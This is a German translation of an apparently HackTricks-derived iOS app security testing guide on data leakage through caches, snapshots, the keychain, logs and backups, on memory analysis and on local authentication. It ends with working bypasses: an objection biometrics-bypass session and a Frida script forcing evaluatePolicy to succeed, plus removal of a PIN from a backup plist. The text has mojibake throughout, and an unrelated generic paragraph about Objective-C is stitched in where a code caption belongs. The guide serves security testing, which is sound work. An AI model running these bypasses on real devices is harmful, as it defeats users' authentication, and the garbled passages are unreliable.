1. Es wird empfohlen, zwischengespeicherte Antworten nach der Abmeldung zu entfernen. Dies kann mit der von Apple bereitgestellten Methode [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) erfolgen. Sie k√∂nnen diese Methode wie folgt aufrufen:

`URLCache.shared.removeAllCachedResponses()`

Diese Methode entfernt alle zwischengespeicherten Anfragen und Antworten aus der Cache.db-Datei.
2. Wenn Sie den Vorteil von Cookies nicht nutzen m√ºssen, wird empfohlen, die [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral)-Konfigurationseigenschaft von URLSession zu verwenden, die das Speichern von Cookies und Caches deaktiviert.

[Apple-Dokumentation](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Ein Objekt der ephemeral-Sitzungskonfiguration √§hnelt einer Standard-Sitzungskonfiguration (siehe default), mit der Ausnahme, dass das entsprechende Sitzungsobjekt keine Caches, Anmeldeinformationenspeicher oder andere sitzungsbezogene Daten auf die Festplatte schreibt. Stattdessen werden sitzungsbezogene Daten im RAM gespeichert. Die einzige Zeit, zu der eine ephemeral-Sitzung Daten auf die Festplatte schreibt, ist, wenn Sie ihr mitteilen, den Inhalt einer URL in eine Datei zu schreiben.`
3. Der Cache kann auch deaktiviert werden, indem die Cache-Richtlinie auf [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed) gesetzt wird. Dadurch wird das Speichern des Caches in irgendeiner Form, entweder im Speicher oder auf der Festplatte, deaktiviert.

### Snapshots

Immer wenn Sie die Home-Taste dr√ºcken, erstellt iOS **einen Schnappschuss des aktuellen Bildschirms**, um den √úbergang zur Anwendung auf eine viel fl√ºssigere Weise durchzuf√ºhren. Wenn sich jedoch **sensible Daten** auf dem aktuellen Bildschirm befinden, werden sie in dem **Bild gespeichert** (das **√ºber Neustarts hinweg bestehen bleibt**). Dies sind die Schnappsch√ºsse, auf die Sie auch zugreifen k√∂nnen, indem Sie zweimal auf den Home-Bildschirm tippen, um zwischen Apps zu wechseln.

Sofern das iPhone nicht gejailbreakt ist, muss der **Angreifer** Zugriff auf das **entsperrte Ger√§t** haben, um diese Screenshots sehen zu k√∂nnen. Standardm√§√üig wird der letzte Schnappschuss im Sandbox der Anwendung im Ordner `Library/Caches/Snapshots/` oder `Library/SplashBoard/Snapshots` gespeichert (vertrauensw√ºrdige Computer k√∂nnen ab iOS 7.0 nicht auf das Dateisystem zugreifen).

Eine M√∂glichkeit, dieses unerw√ºnschte Verhalten zu verhindern, besteht darin, einen leeren Bildschirm einzuf√ºgen oder die sensiblen Daten vor dem Erstellen des Schnappschusses mit der Funktion `ApplicationDidEnterBackground()` zu entfernen.

Hier ist eine Beispiel-Methode zur Behebung des Problems, die einen Standard-Screenshot festlegt.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:

Objective-C ist eine objektorientierte Programmiersprache, die h√§ufig f√ºr die Entwicklung von iOS-Anwendungen verwendet wird. Sie basiert auf der Programmiersprache C und erweitert diese um Funktionen f√ºr die Objektorientierung. Objective-C wird verwendet, um Apps f√ºr iPhones, iPads und andere Apple-Ger√§te zu entwickeln.

Objective-C wurde von Apple entwickelt und ist eng mit der iOS-Plattform verbunden. Es bietet eine Reihe von Funktionen und Frameworks, die speziell f√ºr die Entwicklung von iOS-Anwendungen entwickelt wurden. Mit Objective-C k√∂nnen Entwickler Benutzeroberfl√§chen erstellen, auf Ger√§tefunktionen zugreifen, Netzwerkkommunikation durchf√ºhren und vieles mehr.

Objective-C verwendet das Konzept der Klassen und Objekte, um die Struktur und das Verhalten von iOS-Anwendungen zu definieren. Klassen dienen als Baupl√§ne f√ºr Objekte und enthalten Eigenschaften und Methoden, die das Verhalten der Objekte definieren. Entwickler k√∂nnen neue Klassen erstellen, um benutzerdefinierte Funktionen hinzuzuf√ºgen oder vorhandene Klassen erweitern.

Objective-C bietet auch eine dynamische Typisierung, was bedeutet, dass Objekte zur Laufzeit Informationen √ºber ihre Klassen und Methoden abrufen k√∂nnen. Dies erm√∂glicht eine flexible und erweiterbare Programmierung.

Um Objective-C-Code auszuf√ºhren, wird er in Xcode, der integrierten Entwicklungsumgebung von Apple, geschrieben und kompiliert. Xcode bietet eine Reihe von Tools und Funktionen, die die Entwicklung von iOS-Anwendungen erleichtern, einschlie√ülich eines Emulators zum Testen von Apps auf verschiedenen Ger√§ten.

Objective-C ist eine leistungsstarke Programmiersprache f√ºr die Entwicklung von iOS-Anwendungen und wird von vielen Entwicklern aufgrund ihrer umfangreichen Funktionen und der engen Integration mit der iOS-Plattform gesch√§tzt.
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Dies setzt das Hintergrundbild auf `overlayImage.png`, wann immer die Anwendung in den Hintergrund wechselt. Es verhindert das Auslaufen sensibler Daten, da `overlayImage.png` immer die aktuelle Ansicht √ºberschreibt.

### Schl√ºsselbund

Zum Zugriff auf den iOS-Schl√ºsselbund und dessen Verwaltung stehen Tools wie [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) zur Verf√ºgung, die f√ºr gejailbreakte Ger√§te geeignet sind. Zus√§tzlich bietet [**Objection**](https://github.com/sensepost/objection) den Befehl `ios keychain dump` f√ºr √§hnliche Zwecke.

#### **Speichern von Anmeldedaten**

Die Klasse **NSURLCredential** eignet sich ideal zum direkten Speichern sensibler Informationen im Schl√ºsselbund, um die Verwendung von NSUserDefaults oder anderen Wrapper zu umgehen. Um Anmeldedaten nach dem Login zu speichern, wird der folgende Swift-Code verwendet:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Um diese gespeicherten Anmeldeinformationen abzurufen, wird der Befehl `ios nsurlcredentialstorage dump` von Objection verwendet.

## **Benutzerdefinierte Tastaturen und Tastaturcache**

Ab iOS 8.0 k√∂nnen Benutzer benutzerdefinierte Tastaturerweiterungen installieren, die unter **Einstellungen > Allgemein > Tastatur > Tastaturen** verwaltet werden k√∂nnen. Obwohl diese Tastaturen erweiterte Funktionen bieten, besteht die Gefahr von Tastenprotokollierung und Daten√ºbertragung an externe Server, obwohl Benutzer √ºber Tastaturen, die Netzwerkzugriff erfordern, informiert werden. Apps k√∂nnen und sollten die Verwendung von benutzerdefinierten Tastaturen f√ºr die Eingabe sensibler Informationen einschr√§nken.

**Sicherheitsempfehlungen:**
- Es wird empfohlen, Drittanbieter-Tastaturen f√ºr erh√∂hte Sicherheit zu deaktivieren.
- Beachten Sie die Funktionen zur automatischen Korrektur und automatischen Vorschl√§gen der standardm√§√üigen iOS-Tastatur, die sensible Informationen in Cache-Dateien speichern k√∂nnen, die sich in `Library/Keyboard/{locale}-dynamic-text.dat` oder `/private/var/mobile/Library/Keyboard/dynamic-text.dat` befinden. Diese Cache-Dateien sollten regelm√§√üig auf sensible Daten √ºberpr√ºft werden. Es wird empfohlen, das Tastaturw√∂rterbuch √ºber **Einstellungen > Allgemein > Zur√ºcksetzen > Tastaturw√∂rterbuch zur√ºcksetzen** zur√ºckzusetzen, um den zwischengespeicherten Daten zu l√∂schen.
- Das Abfangen des Netzwerkverkehrs kann zeigen, ob eine benutzerdefinierte Tastatur Tastenanschl√§ge remote √ºbertr√§gt.

### **Verhindern des Cachings von Textfeldern**

Das [UITextInputTraits-Protokoll](https://developer.apple.com/reference/uikit/uitextinputtraits) bietet Eigenschaften zur Verwaltung der automatischen Korrektur und der sicheren Texteingabe, die f√ºr die Verhinderung des Cachings sensibler Informationen unerl√§sslich sind. Zum Beispiel kann die Deaktivierung der automatischen Korrektur und die Aktivierung der sicheren Texteingabe mit folgendem Code erreicht werden:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Dar√ºber hinaus sollten Entwickler sicherstellen, dass Textfelder, insbesondere solche zum Eingeben sensibler Informationen wie Passw√∂rter und PINs, das Zwischenspeichern deaktivieren, indem sie `autocorrectionType` auf `UITextAutocorrectionTypeNo` und `secureTextEntry` auf `YES` setzen.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Protokolle**

Bei der Fehlerbehebung wird oft **Protokollierung** verwendet. Dabei besteht das Risiko, dass **Protokolle sensible Informationen enthalten**. Fr√ºher waren in iOS 6 und fr√ºheren Versionen die Protokolle f√ºr alle Apps zug√§nglich, was ein Risiko f√ºr den Verlust sensibler Daten darstellte. **Jetzt haben Anwendungen nur noch Zugriff auf ihre eigenen Protokolle**.

Trotz dieser Einschr√§nkungen kann ein **Angreifer mit physischem Zugriff** auf ein entsperrtes Ger√§t dies ausnutzen, indem er das Ger√§t mit einem Computer verbindet und **die Protokolle liest**. Es ist wichtig zu beachten, dass die Protokolle auch nach der Deinstallation der App auf der Festplatte verbleiben.

Um Risiken zu minimieren, wird empfohlen, **ausf√ºhrlich mit der App zu interagieren**, alle Funktionen und Eingaben zu erkunden, um sicherzustellen, dass keine sensiblen Informationen versehentlich protokolliert werden.

Bei der √úberpr√ºfung des Quellcodes der App auf m√∂gliche Lecks sollten sowohl **vordefinierte** als auch **benutzerdefinierte Protokollierungsanweisungen** mit Schl√ºsselw√∂rtern wie `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` f√ºr integrierte Funktionen und Erw√§hnungen von `Logging` oder `Logfile` f√ºr benutzerdefinierte Implementierungen gesucht werden.

### **√úberwachung der Systemprotokolle**

Apps protokollieren verschiedene Informationen, die sensibel sein k√∂nnen. Zur √úberwachung dieser Protokolle k√∂nnen Tools und Befehle wie:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
sind n√ºtzlich. Zus√§tzlich bietet **Xcode** eine M√∂glichkeit, Konsolenprotokolle zu sammeln:

1. √ñffne Xcode.
2. Verbinde das iOS-Ger√§t.
3. Navigiere zu **Fenster** -> **Ger√§te und Simulatoren**.
4. W√§hle dein Ger√§t aus.
5. L√∂se das Problem aus, das du untersuchst.
6. Verwende die Schaltfl√§che **Konsole √∂ffnen**, um die Protokolle in einem neuen Fenster anzuzeigen.

F√ºr fortgeschrittenes Protokollieren kann die Verbindung zur Ger√§teshell und die Verwendung von **socat** eine Echtzeit-Protokoll√ºberwachung erm√∂glichen:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Gefolgt von Befehlen zur Beobachtung von Protokollaktivit√§ten, die bei der Diagnose von Problemen oder der Identifizierung potenzieller Datenlecks in Protokollen von unsch√§tzbarem Wert sein k√∂nnen.


***

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Backups

**Automatische Backup-Funktionen** sind in iOS integriert und erleichtern die Erstellung von Ger√§tedatensicherungen √ºber iTunes (bis macOS Catalina), Finder (ab macOS Catalina) oder iCloud. Diese Backups umfassen fast alle Ger√§tedaten, mit Ausnahme hochsensibler Elemente wie Apple Pay-Daten und Touch ID-Konfigurationen.

### Sicherheitsrisiken

Die Aufnahme von **installierten Apps und ihren Daten** in Backups wirft die Frage nach potenziellen **Datenlecks** auf und birgt das Risiko, dass **Backup-√Ñnderungen die App-Funktionalit√§t beeintr√§chtigen** k√∂nnten. Es wird empfohlen, **sensible Informationen nicht im Klartext** in einem Verzeichnis einer App oder in dessen Unterverzeichnissen zu speichern, um diese Risiken zu mindern.

### Ausschlie√üen von Dateien aus Backups

Dateien in `Documents/` und `Library/Application Support/` werden standardm√§√üig gesichert. Entwickler k√∂nnen bestimmte Dateien oder Verzeichnisse von Backups ausschlie√üen, indem sie `NSURL setResourceValue:forKey:error:` mit dem `NSURLIsExcludedFromBackupKey` verwenden. Diese Praxis ist entscheidend, um zu verhindern, dass sensible Daten in Backups aufgenommen werden.

### Testen auf Sicherheitsl√ºcken

Um die Backup-Sicherheit einer App zu bewerten, beginnen Sie mit der **Erstellung eines Backups** mit Hilfe des Finders und lokalisieren Sie es anhand der Anleitung in der [offiziellen Dokumentation von Apple](https://support.apple.com/en-us/HT204215). Analysieren Sie das Backup auf sensible Daten oder Konfigurationen, die ge√§ndert werden k√∂nnten, um das Verhalten der App zu beeinflussen.

Sensible Informationen k√∂nnen mit Befehlszeilentools oder Anwendungen wie [iMazing](https://imazing.com) gesucht werden. Bei verschl√ºsselten Backups kann die Verschl√ºsselung durch √úberpr√ºfen des Schl√ºssels "IsEncrypted" in der Datei "Manifest.plist" im Stammverzeichnis des Backups best√§tigt werden.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
F√ºr den Umgang mit verschl√ºsselten Backups k√∂nnen Python-Skripte aus dem [DinoSec-GitHub-Repository](https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts) n√ºtzlich sein, wie z.B. **backup_tool.py** und **backup_passwd.py**, die jedoch m√∂glicherweise Anpassungen erfordern, um mit den neuesten iTunes/Finder-Versionen kompatibel zu sein. Eine weitere Option zum Zugriff auf Dateien in passwortgesch√ºtzten Backups ist das Tool [**iOSbackup**](https://pypi.org/project/iOSbackup/).

### √Ñnderung des App-Verhaltens

Ein Beispiel f√ºr die √Ñnderung des App-Verhaltens durch Modifikationen am Backup wird in der [Bither Bitcoin Wallet App](https://github.com/bither/bither-ios) demonstriert, bei der die UI-Sperr-PIN unter dem Schl√ºssel **pin_code** in `net.bither.plist` gespeichert ist. Durch Entfernen dieses Schl√ºssels aus der Plist und Wiederherstellen des Backups wird die PIN-Anforderung entfernt und uneingeschr√§nkter Zugriff erm√∂glicht.

## Zusammenfassung zum Testen des Speichers f√ºr sensible Daten

Beim Umgang mit sensiblen Informationen, die in einem Anwendungsspeicher gespeichert sind, ist es entscheidend, die Expositionszeit dieser Daten zu begrenzen. Es gibt zwei Hauptans√§tze zur Untersuchung des Speicherinhalts: **Erstellen eines Speicherabbilds** und **Analyse des Speichers in Echtzeit**. Beide Methoden haben ihre Herausforderungen, einschlie√ülich der M√∂glichkeit, w√§hrend des Dump-Prozesses oder der Analyse wichtige Daten zu √ºbersehen.

## **Abrufen und Analysieren eines Speicherabbilds**

F√ºr jailbroken und nicht-jailbroken Ger√§te erm√∂glichen Tools wie [objection](https://github.com/sensepost/objection) und [Fridump](https://github.com/Nightbringer21/fridump) das Dumpen des Speichers eines App-Prozesses. Sobald das Dump erstellt wurde, erfordert die Analyse dieser Daten verschiedene Tools, abh√§ngig von der Art der gesuchten Informationen.

Um Zeichenfolgen aus einem Speicherabbild zu extrahieren, k√∂nnen Befehle wie `strings` oder `rabin2 -zz` verwendet werden:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
F√ºr eine detailliertere Analyse, einschlie√ülich der Suche nach bestimmten Datentypen oder Mustern, bietet **radare2** umfangreiche Suchm√∂glichkeiten:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Laufzeit-Speicheranalyse**

**r2frida** bietet eine leistungsstarke Alternative zur Inspektion des Speichers einer App in Echtzeit, ohne dass ein Speicherabbild ben√∂tigt wird. Dieses Tool erm√∂glicht die Ausf√ºhrung von Suchbefehlen direkt im laufenden Speicher der Anwendung:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## Schwache Kryptographie

### Mangelhafte Schl√ºsselverwaltungsprozesse

Einige Entwickler speichern sensible Daten im lokalen Speicher und verschl√ºsseln sie mit einem im Code fest codierten/vorhersehbaren Schl√ºssel. Dies sollte vermieden werden, da durch Reverse Engineering vertrauliche Informationen von Angreifern extrahiert werden k√∂nnen.

### Verwendung unsicherer und/oder veralteter Algorithmen

Entwickler sollten keine **veralteten Algorithmen** zur Durchf√ºhrung von Autorisierungspr√ºfungen, zum **Speichern** oder **Senden** von Daten verwenden. Einige dieser Algorithmen sind: RC4, MD4, MD5, SHA1... Wenn beispielsweise Hashes zur Speicherung von Passw√∂rtern verwendet werden, sollten hash-basierte Brute-Force-resistente Algorithmen mit Salz verwendet werden.

### √úberpr√ºfung

Die Haupt√ºberpr√ºfungen, die durchgef√ºhrt werden sollten, sind das Auffinden von **fest codierten** Passw√∂rtern/Geheimnissen im Code oder ob diese **vorhersehbar** sind und ob der Code schwache Kryptographiealgorithmen verwendet.

Es ist interessant zu wissen, dass Sie einige **Kryptobibliotheken** automatisch mit **objection** √ºberwachen k√∂nnen, indem Sie Folgendes verwenden:
```swift
ios monitor crypt
```
F√ºr **weitere Informationen** zu iOS-Kryptografie-APIs und -Bibliotheken besuchen Sie [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Lokale Authentifizierung

Die **lokale Authentifizierung** spielt eine wichtige Rolle, insbesondere wenn es darum geht, den Zugriff an einem entfernten Endpunkt durch kryptografische Methoden abzusichern. Die Essenz hierbei ist, dass lokale Authentifizierungsmechanismen ohne ordnungsgem√§√üe Implementierung umgangen werden k√∂nnen.

Apples **[Local Authentication Framework](https://developer.apple.com/documentation/localauthentication)** und der **[Schl√ºsselbund](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html)** bieten robuste APIs f√ºr Entwickler, um Benutzerauthentifizierungsdialoge zu erleichtern und geheime Daten sicher zu verarbeiten. Der Secure Enclave sichert die Fingerabdruck-ID f√ºr Touch ID, w√§hrend Face ID auf Gesichtserkennung ohne Kompromittierung biometrischer Daten basiert.

Um Touch ID/Face ID zu integrieren, haben Entwickler zwei API-Optionen:
- **`LocalAuthentication.framework`** f√ºr die Benutzerauthentifizierung auf hoher Ebene ohne Zugriff auf biometrische Daten.
- **`Security.framework`** f√ºr den Zugriff auf Schl√ºsselbunddienste auf niedrigerer Ebene, um geheime Daten mit biometrischer Authentifizierung zu sichern. Verschiedene [Open-Source-Wrapper](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) vereinfachen den Zugriff auf den Schl√ºsselbund.

{% hint style="danger" %}
Sowohl `LocalAuthentication.framework` als auch `Security.framework` weisen jedoch Sicherheitsl√ºcken auf, da sie haupts√§chlich boolesche Werte zur√ºckgeben, ohne Daten f√ºr Authentifizierungsprozesse zu √ºbertragen, was sie anf√§llig f√ºr Umgehungen macht (siehe [Don't touch me that way, von David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Implementierung der lokalen Authentifizierung

Um Benutzer zur Authentifizierung aufzufordern, sollten Entwickler die Methode **`evaluatePolicy`** in der Klasse **`LAContext`** verwenden und zwischen folgenden Optionen w√§hlen:
- **`deviceOwnerAuthentication`**: Fordert Touch ID oder Ger√§te-Passcode an und schl√§gt fehl, wenn keines davon aktiviert ist.
- **`deviceOwnerAuthenticationWithBiometrics`**: Fordert ausschlie√ülich Touch ID an.

Eine erfolgreiche Authentifizierung wird durch einen booleschen R√ºckgabewert von **`evaluatePolicy`** angezeigt, der auf eine potenzielle Sicherheitsl√ºcke hinweist.

### Lokale Authentifizierung mit dem Schl√ºsselbund

Die Implementierung der **lokalen Authentifizierung** in iOS-Apps erfolgt mithilfe von **Schl√ºsselbund-APIs**, um geheime Daten wie Authentifizierungstoken sicher zu speichern. Dieser Prozess stellt sicher, dass die Daten nur vom Benutzer unter Verwendung seines Ger√§te-Passcodes oder der biometrischen Authentifizierung wie Touch ID abgerufen werden k√∂nnen.

Der Schl√ºsselbund bietet die M√∂glichkeit, Elemente mit dem Attribut `SecAccessControl` festzulegen, das den Zugriff auf das Element einschr√§nkt, bis der Benutzer sich erfolgreich √ºber Touch ID oder Ger√§te-Passcode authentifiziert hat. Diese Funktion ist entscheidend f√ºr die Verbesserung der Sicherheit.

Nachfolgend finden Sie Codebeispiele in Swift und Objective-C, die zeigen, wie ein String im Schl√ºsselbund gespeichert und abgerufen werden kann, wobei diese Sicherheitsfunktionen genutzt werden. Die Beispiele zeigen speziell, wie die Zugriffskontrolle eingerichtet wird, um eine Touch ID-Authentifizierung zu erfordern und sicherzustellen, dass die Daten nur auf dem Ger√§t zug√§nglich sind, auf dem sie eingerichtet wurden, unter der Bedingung, dass ein Ger√§te-Passcode konfiguriert ist.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

Jetzt k√∂nnen wir den gespeicherten Eintrag aus dem Schl√ºsselbund anfordern. Die Schl√ºsselbunddienste zeigen dem Benutzer den Authentifizierungsdialog an und geben Daten oder nil zur√ºck, abh√§ngig davon, ob ein geeigneter Fingerabdruck bereitgestellt wurde oder nicht.

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Erkennung

Die Verwendung von Frameworks in einer App kann auch durch Analyse der Liste der gemeinsam genutzten dynamischen Bibliotheken der App-Bin√§rdatei erkannt werden. Dies kann mit `otool` durchgef√ºhrt werden:
```bash
$ otool -L <AppName>.app/<AppName>
```
Wenn `LocalAuthentication.framework` in einer App verwendet wird, enth√§lt die Ausgabe beide der folgenden Zeilen (denken Sie daran, dass `LocalAuthentication.framework` `Security.framework` intern verwendet):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Wenn `Security.framework` verwendet wird, wird nur der zweite angezeigt.

### Umgehung des Local Authentication Frameworks

#### **Objection**

Durch die **Objection Biometrics Bypass**-Technik, die auf [dieser GitHub-Seite](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) zu finden ist, steht eine Methode zur Verf√ºgung, um den **LocalAuthentication**-Mechanismus zu umgehen. Der Kern dieses Ansatzes besteht darin, **Frida** zu nutzen, um die Funktion `evaluatePolicy` zu manipulieren, so dass sie immer ein `True`-Ergebnis liefert, unabh√§ngig vom tats√§chlichen Authentifizierungserfolg. Dies ist besonders n√ºtzlich, um fehlerhafte biometrische Authentifizierungsprozesse zu umgehen.

Um diese Umgehung zu aktivieren, wird der folgende Befehl verwendet:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Dieser Befehl l√∂st eine Sequenz aus, bei der Objection eine Aufgabe registriert, die das Ergebnis der `evaluatePolicy`-√úberpr√ºfung effektiv auf `True` √§ndert.

#### Frida

Ein Beispiel f√ºr die Verwendung von **`evaluatePolicy`** aus der [DVIA-v2-Anwendung](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Um die **Umgehung** der lokalen Authentifizierung zu erreichen, wird ein Frida-Skript geschrieben. Dieses Skript zielt auf die **evaluatePolicy**-√úberpr√ºfung ab und unterbricht den R√ºckruf, um sicherzustellen, dass er **success=1** zur√ºckgibt. Durch √Ñndern des Verhaltens des R√ºckrufs wird die Authentifizierungspr√ºfung effektiv umgangen.

Das folgende Skript wird eingef√ºgt, um das Ergebnis der Methode **evaluatePolicy** zu √§ndern. Es √§ndert das Ergebnis des R√ºckrufs so, dass immer Erfolg angezeigt wird.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Um das Frida-Skript einzuf√ºgen und die biometrische Authentifizierung zu umgehen, wird der folgende Befehl verwendet:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Offenlegung sensibler Funktionen durch IPC

### Benutzerdefinierte URI-Handler / Deeplinks / Benutzerdefinierte Schemata

